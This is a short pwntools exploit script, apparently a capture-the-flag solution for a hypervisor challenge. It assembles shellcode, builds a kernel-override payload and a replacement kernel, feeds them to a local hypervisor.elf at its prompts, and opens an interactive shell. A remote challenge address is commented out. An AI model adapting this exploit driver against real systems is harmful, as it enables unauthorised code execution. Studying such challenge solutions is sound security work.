from pwn import *
from binascii import hexlify
from assembler import assemble # This was my assembler code


code = assemble('exp3.asm') 

p = process(['nasm', 'kernel_over.asm'])
p.wait() # Assuming this is successful
p = process(['make', '-C', 'exp_kernel'])
p.wait() # Assuming this is successful

data = open('kernel_over', 'rb').read()
kern = open('exp_kernel/hack.bin').read()

#p = remote('35.200.23.198', 31733)
p = process(['./hypervisor.elf', 'kernel.bin', 'ld.so.2', './user.elf'])
p.sendline(code)
p.recvuntil('Please enter code to override kernel with:\0')
p.send(data)
p.recvuntil('Kernel code please: ')
p.send(kern)
p.interactive()
